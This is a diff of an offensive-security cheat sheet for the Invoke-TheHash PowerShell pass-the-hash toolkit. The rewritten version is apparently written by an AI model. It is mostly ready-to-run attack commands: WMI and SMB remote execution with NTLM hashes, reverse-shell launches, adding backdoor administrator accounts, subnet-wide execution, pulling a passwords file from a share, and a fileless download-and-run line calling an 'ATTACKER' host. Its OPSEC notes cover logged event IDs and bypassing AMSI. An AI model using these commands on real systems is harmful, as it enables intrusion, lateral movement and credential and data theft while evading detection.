@@ -1,16 +1,145 @@
-#Invoke-TheHash #passthehash #crendentals #auth #authentication 
-- PowerShell to pass the hash
-- [GitHub - Kevin-Robertson/Invoke-TheHash: PowerShell Pass The Hash Utils](https://github.com/Kevin-Robertson/Invoke-TheHash)
-- `Import-Module ./Invoke-TheHash.psd1` Import the tool into powershell runtime
-- `Invoke-WMIExec` WMI command execution function.
-	- `Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose`
-	- `Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e {BASE64 of a reverseshell}}"`
-- `Invoke-SMBExec` SMB (PsExec) command execution function supporting SMB1, SMB2.1, with and without SMB signing.
-	- `Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose`
-	- `Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose`
-- `Invoke-SMBEnum` performs User, Group, NetSession and Share enumeration tasks over SMB2.1 with and without SMB signing.
-	- `Invoke-SMBEnum -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -verbose`
-- `Invoke-SMBClient` This function primarily provides SMB file share capabilities for working with hashes that do not have remote command execution privilege.
-	- `Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Source \\server\share -verbose`
-- `Invoke-TheHash` Function for running Invoke-TheHash functions against multiple targets.
-	- `Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0`
+# Invoke-TheHash
+
+**Tags:** `#invokethehash` `#passthehash` `#lateral` `#windows` `#powershell` `#wmi` `#smb`
+
+PowerShell Pass-the-Hash toolkit for Windows-side lateral movement. Performs WMI and SMB command execution, SMB enumeration, and SMB file operations using NTLM hashes — no plaintext password required. Useful when you have a Windows foothold and need to move laterally without dropping Impacket tools.
+
+**Source:** https://github.com/Kevin-Robertson/Invoke-TheHash
+**Install:** `IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-TheHash.psd1')`
+
+```powershell
+# Import module
+Import-Module .\Invoke-TheHash.psd1
+
+# WMI command execution via PTH
+Invoke-WMIExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator -Hash NTLMhash -Command "whoami"
+```
+
+---
+
+## Import
+
+```powershell
+# From disk
+Import-Module .\Invoke-TheHash.psd1
+
+# In-memory (fileless)
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-TheHash.ps1')
+```
+
+---
+
+## Invoke-WMIExec — WMI Command Execution
+
+```powershell
+# Basic command execution
+Invoke-WMIExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
+  -Hash NTLMhash -Command "whoami" -Verbose
+
+# Reverse shell (base64-encoded PS command)
+Invoke-WMIExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
+  -Hash NTLMhash -Command "powershell -e <BASE64_REVERSESHELL>"
+
+# Add local admin
+Invoke-WMIExec -Target 192.168.1.10 -Domain DOMAIN -Username julio \
+  -Hash 64F12CDDAA88057E06A81B54E73B949B \
+  -Command "net user hacker Password123! /add && net localgroup administrators hacker /add"
+
+# Local account (no domain)
+Invoke-WMIExec -Target 192.168.1.10 -Domain . -Username Administrator \
+  -Hash NTLMhash -Command "whoami"
+```
+
+---
+
+## Invoke-SMBExec — SMB Command Execution
+
+Supports SMB1 and SMB2.1, with and without SMB signing.
+
+```powershell
+# Command execution via SMB
+Invoke-SMBExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
+  -Hash NTLMhash -Command "whoami" -Verbose
+
+# Add local admin via SMB
+Invoke-SMBExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
+  -Hash NTLMhash \
+  -Command "net user hacker Password123! /add && net localgroup administrators hacker /add" -Verbose
+
+# Reverse shell
+Invoke-SMBExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
+  -Hash NTLMhash -Command "powershell -e <BASE64_REVERSESHELL>"
+```
+
+---
+
+## Invoke-SMBEnum — SMB Enumeration
+
+```powershell
+# Enumerate users, groups, sessions, shares over SMB with hash
+Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
+  -Hash NTLMhash -Verbose
+
+# Enumerate specific items
+Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
+  -Hash NTLMhash -Group            # groups only
+Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
+  -Hash NTLMhash -User             # users only
+Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
+  -Hash NTLMhash -NetSession       # active sessions
+```
+
+---
+
+## Invoke-SMBClient — SMB File Operations
+
+For accounts that have share access but not command execution rights.
+
+```powershell
+# List share contents
+Invoke-SMBClient -Domain DOMAIN -Username user -Hash NTLMhash \
+  -Source \\server\share -Verbose
+
+# Download file
+Invoke-SMBClient -Domain DOMAIN -Username user -Hash NTLMhash \
+  -Source \\server\share\passwords.xlsx -Destination C:\Windows\Temp\passwords.xlsx
+
+# Upload file
+Invoke-SMBClient -Domain DOMAIN -Username user -Hash NTLMhash \
+  -Source C:\Windows\Temp\tool.exe -Destination \\server\share\tool.exe
+```
+
+---
+
+## Invoke-TheHash — Multi-Target
+
+Run WMIExec or SMBExec across a subnet.
+
+```powershell
+# WMI exec across subnet
+Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 \
+  -Username Administrator -Hash NTLMhash -Command "whoami"
+
+# Exclude specific host
+Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -TargetExclude 192.168.1.50 \
+  -Username Administrator -Hash NTLMhash -Command "whoami"
+
+# SMBExec across subnet
+Invoke-TheHash -Type SMBExec -Target 192.168.1.0/24 \
+  -Username Administrator -Hash NTLMhash -Command "whoami"
+```
+
+---
+
+## OPSEC Notes
+
+- WMI execution generates Event ID **4624** (logon type 3) + WMI activity logs on target
+- SMBExec installs a service — Event ID **7045** on target
+- PowerShell module triggers AMSI — bypass before loading (`Bypass-4MSI` in evil-winrm, or manual patch)
+- Subnet scanning (`192.168.1.0/24`) generates many auth events across hosts
+
+---
+
+*Created: 2026-03-06*
+*Updated: 2026-03-06*
+*Model: claude-sonnet-4-6*
